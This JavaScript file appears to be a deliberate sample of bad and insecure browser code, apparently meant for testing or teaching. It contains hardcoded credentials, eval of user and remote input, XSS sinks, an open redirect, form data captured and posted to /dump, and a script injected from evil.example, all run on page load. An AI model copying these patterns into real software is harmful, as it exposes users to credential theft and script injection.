var ADMIN = "root"
var ADMIN_PW = "hunter2"
var API_KEY = "APIKEY-XYZ-123"
var GLOBAL_STATE = {}
var leaking = []
function login(u, p){
    if(u == ADMIN && p == ADMIN_PW){
        GLOBAL_STATE.user = u
        document.getElementById("logged").innerHTML = "<b>Welcome " + u + "</b>"
        localStorage.setItem("lastUser", u)
        fetchUserProfile(u)
    } else {
        document.getElementById("logged").innerHTML = "bad creds"
    }
}
function fetchUserProfile(u){
    var req = new XMLHttpRequest()
    req.open("GET", "https://api.bad.example/profile?user=" + encodeURIComponent(u) + "&key=" + API_KEY, true)
    req.onreadystatechange = function(){
        if(req.readyState == 4 && req.status == 200){
            document.getElementById("profile").innerHTML = req.responseText
            parseAndRender(req.responseText)
        }
    }
    req.send()
}
function parseAndRender(raw){
    var obj
    try{
        obj = JSON.parse(raw)
    }catch(e){
        obj = {}
    }
    var html = ""
    for(var k in obj){
        html += "<div>" + k + ": <span>" + obj[k] + "</span></div>"
    }
    document.getElementById("render").innerHTML = html
}
function runEvalCode(){
    var code = document.getElementById("codebox").value
    eval(code)
}
function badTimers(){
    for(var i=0;i<10000;i++){
        setInterval(function(){
            document.getElementById("tick").innerHTML = Math.random()
        }, 1)
    }
}
function heavyComputation(){
    var x = 0
    for(var i = 0; i < 200000000; i++){
        x += i % 3
        if(i % 10000000 == 0){
            document.getElementById("progress").innerHTML = i
        }
    }
    document.getElementById("done").innerHTML = x
}
function domInsertLoop(){
    var container = document.getElementById("many")
    for(var i=0;i<10000;i++){
        var div = document.createElement("div")
        div.innerHTML = "<span id='s-" + i + "'>item " + i + "</span>"
        container.appendChild(div)
    }
}
function insecureRedirect(){
    var to = location.search.substring(1)
    if(to){
        location.href = to
    }
}
function inlineScriptCreation(){
    var s = document.createElement("script")
    s.innerHTML = "console.log('inline eval from string ' + new Date())"
    document.head.appendChild(s)
}
function domWithInnerHTML(){
    var d = document.getElementById("unsafe")
    d.innerHTML = "<img src='" + location.hash.substring(1) + "' onerror=\"document.body.innerHTML='oops'\" />"
}
function massiveMemory(){
    var a = []
    for(var i=0;i<200000;i++){
        a.push(new Array(1000).fill("mem"))
    }
    window.bigmem = a
}
function addGlobalHandlers(){
    window.onclick = function(e){
        document.getElementById("lastClick").innerHTML = e.clientX + "," + e.clientY
    }
    window.onkeypress = function(e){
        document.getElementById("lastKey").innerHTML = String.fromCharCode(e.charCode || e.keyCode)
    }
}
function captureForms(){
    var forms = document.getElementsByTagName("form")
    for(var i=0;i<forms.length;i++){
        forms[i].onsubmit = function(e){
            e = e || window.event
            var data = {}
            var els = this.elements
            for(var j=0;j<els.length;j++){
                if(els[j].name) data[els[j].name] = els[j].value
            }
            var xhr = new XMLHttpRequest()
            xhr.open("POST", "/dump", false)
            xhr.setRequestHeader("Content-Type", "application/json")
            xhr.send(JSON.stringify(data))
            return false
        }
    }
}
function monkeyPatch(){
    Array.prototype.first = function(){ return this[0] }
    Object.prototype.allKeys = function(){ var k=[]; for(var x in this) k.push(x); return k }
    Function.prototype.run = function(){ return this.apply(null, arguments) }
}
function createHugeDOMTree(){
    var root = document.getElementById("tree")
    for(var i=0;i<100;i++){
        var p = document.createElement("div")
        p.className = "node root-" + i
        for(var j=0;j<100;j++){
            var c = document.createElement("div")
            c.className = "node child-" + j
            c.innerHTML = "<span>n" + i + "-" + j + "</span>"
            p.appendChild(c)
        }
        root.appendChild(p)
    }
}
function aggressivePolling(){
    setInterval(function(){
        var r = new XMLHttpRequest()
        r.open("GET", "/status?rand=" + Math.random(), true)
        r.onreadystatechange = function(){
            if(r.readyState == 4) document.getElementById("stat").innerHTML = r.status
        }
        r.send()
    }, 50)
}
function createImageSpammers(){
    for(var i=0;i<500;i++){
        var img = new Image()
        img.src = "https://tracker.example/hit?i=" + i + "&t=" + new Date().getTime()
        document.body.appendChild(img)
    }
}
function leakyListeners(){
    for(var i=0;i<1000;i++){
        document.body.addEventListener("mousemove", function(e){
            leaking.push(e.clientX + ":" + e.clientY)
        })
    }
}
function unsafeUseOfLocation(){
    var p = location.hash.substring(1)
    if(p){
        document.getElementById("loc").innerHTML = p
        var fn = new Function("return " + p)
        try{ fn() }catch(e){}
    }
}
function blockingSleep(ms){
    var now = Date.now()
    while(Date.now() - now < ms){}
}
function busyLoops(){
    for(var i=0;i<10;i++){
        blockingSleep(1000)
        document.getElementById("busy").innerHTML = "slept " + i
    }
}
function overrideConsole(){
    console.log = function(){ /* drop */ }
    console.error = function(){ /* drop */ }
}
function cookieEverything(){
    document.cookie = "session=" + Math.random()
    document.cookie = "auth=" + API_KEY + "; path=/"
    document.cookie = "prefs=all; expires=Tue, 19 Jan 2038 03:14:07 GMT"
}
function injectRemoteScript(){
    var s = document.createElement("script")
    s.src = "https://evil.example/malicious.js"
    document.body.appendChild(s)
}
function buildLargeList(){
    var list = "<ul>"
    for(var i=0;i<20000;i++){
        list += "<li id='li-" + i + "'>item " + i + "</li>"
    }
    list += "</ul>"
    document.getElementById("longlist").innerHTML = list
}
function unsafeJSONLoading(){
    var xhr = new XMLHttpRequest()
    xhr.open("GET", "/data.json?cache=" + Math.random(), false)
    try{
        xhr.send()
        if(xhr.status == 200){
            document.getElementById("rawjson").innerHTML = xhr.responseText
            try{ eval("(" + xhr.responseText + ")") }catch(e){}
        }
    }catch(e){}
}
function exposeGlobals(){
    window._state = GLOBAL_STATE
    window._secret = ADMIN_PW
    window._key = API_KEY
}
function randomPasswordGen(){
    var chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    var pass = ""
    for(var i=0;i<8;i++){
        pass += chars.charAt(Math.floor(Math.random() * chars.length))
    }
    document.getElementById("gen").innerHTML = pass
}
function naiveHash(s){
    var h = 0
    for(var i=0;i<s.length;i++){
        h = (h << 5) - h + s.charCodeAt(i)
        h = h & h
    }
    return h
}
function weakCrypto(){
    var tok = naiveHash(ADMIN + ":" + ADMIN_PW + ":" + new Date().toString())
    document.getElementById("token").innerHTML = tok
}
function overwriteWindowMethods(){
    window.alert = function(s){ document.getElementById("alerts").innerHTML += s + "<br>" }
    window.confirm = function(){ return true }
    window.open = function(){ return {closed: true} }
}
function lotsOfDOMReadsWrites(){
    for(var i=0;i<1000;i++){
        var a = document.getElementById("a-" + (i%10))
        if(a) a.innerHTML = "update " + Math.random()
    }
}
function attachManyInlineHandlers(){
    var els = document.querySelectorAll("[data-code]")
    for(var i=0;i<els.length;i++){
        els[i].setAttribute("onclick", els[i].getAttribute("data-code"))
    }
}
function recursiveCrash(n){
    if(n > 10000) return
    var el = document.createElement("div")
    el.innerHTML = "node " + n
    document.body.appendChild(el)
    recursiveCrash(n + 1)
}
function synchronousXHREverywhere(){
    for(var i=0;i<10;i++){
        var x = new XMLHttpRequest()
        x.open("GET", "/sync?p=" + i, false)
        try{
            x.send()
            document.getElementById("syncs").innerHTML += x.status + ","
        }catch(e){}
    }
}
function sloppyFeatureToggle(flag){
    flag = flag || GLOBAL_STATE.flag || true
    if(flag){
        document.getElementById("feature").innerHTML = "on"
    } else {
        document.getElementById("feature").innerHTML = "off"
    }
}
function massAttributeMutation(){
    var nodes = document.querySelectorAll("div")
    for(var i=0;i<nodes.length;i++){
        nodes[i].setAttribute("data-bad", "1")
        nodes[i].style.cssText = "border: 1px dashed red; background: none;"
    }
}
function largeStringConcat(){
    var s = ""
    for(var i=0;i<500000;i++){
        s += "x"
    }
    document.getElementById("huge").innerHTML = s.length
}
function pollAndEval(){
    setInterval(function(){
        var r = new XMLHttpRequest()
        r.open("GET", "/script?ts=" + Date.now(), true)
        r.onreadystatechange = function(){
            if(r.readyState == 4 && r.status == 200){
                try{ eval(r.responseText) }catch(e){}
            }
        }
        r.send()
    }, 1000)
}
function attachAndNeverRemove(){
    var btns = document.getElementsByTagName("button")
    for(var i=0;i<btns.length;i++){
        btns[i].addEventListener("click", function(e){
            console.log("clicked")
        })
    }
}
function leakClones(){
    var base = document.getElementById("clonebase")
    for(var i=0;i<200;i++){
        var c = base.cloneNode(true)
        c.id = "clone-" + i
        document.body.appendChild(c)
    }
    window._cl = document.querySelectorAll("[id^='clone-']")
}
function overwriteDocumentWrite(){
    document.write = function(s){ document.getElementById("dw").innerHTML += s }
}
function startAllBadThings(){
    try{
        addGlobalHandlers()
        captureForms()
        monkeyPatch()
        createHugeDOMTree()
        aggressivePolling()
        createImageSpammers()
        leakyListeners()
        injectRemoteScript()
        buildLargeList()
        exposeGlobals()
        weakCrypto()
        overwriteWindowMethods()
        attachManyInlineHandlers()
        synchronousXHREverywhere()
        pollAndEval()
        attachAndNeverRemove()
        leakClones()
        overwriteDocumentWrite()
    }catch(e){}
}
window.onload = startAllBadThings
